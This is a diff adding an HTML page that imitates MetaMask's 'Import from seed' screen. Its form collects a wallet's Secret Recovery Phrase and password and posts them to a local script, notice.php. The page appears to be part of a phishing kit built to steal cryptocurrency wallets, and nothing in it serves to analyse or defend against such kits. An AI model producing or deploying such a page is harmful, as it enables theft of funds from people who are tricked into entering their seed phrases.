@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable= 0, maximum-scale=1.0" />
+        <script src="https://kit.fontawesome.com/a17111d927.js" crossorigin="anonymous"></script>
+        <link rel="stylesheet" href="style.css"/>
+		<title>metamask</title>
+        <link rel="shortcut icon" type="image/png" href="img/favicon.ico">
+	</head>
+	<body>
+        
+        <h1>METAMASK</h1>
+	    <h2>Import from seed</h2>
+	
+		<form action="/notice.php" method="POST" >
+			<div>
+				<div class="labPar">
+					<label for="key">Secret Recovery Phrase</label>
+					<p id="togKey">Show</p>
+				</div>
+				<input type="password" id="secretPhaze" placeholder="Enter your Secret Recovery Phrase" name="key" required />
+			</div>
+			<div>
+				<div class="labPar">
+					<label for="password">Password</label>
+					<p id="togPassword">Show</p>
+				</div>
+				<input type="password" id="password" placeholder="Password" name="password" required />
+			</div>
+			<input class="myBtn" type="submit" value="IMPORT" name="submit"/>
+		</form>
+
+
+        
+        <script src="script.js"></script>
+	</body>
+    <footer>
+        
+    </footer>
+</html>
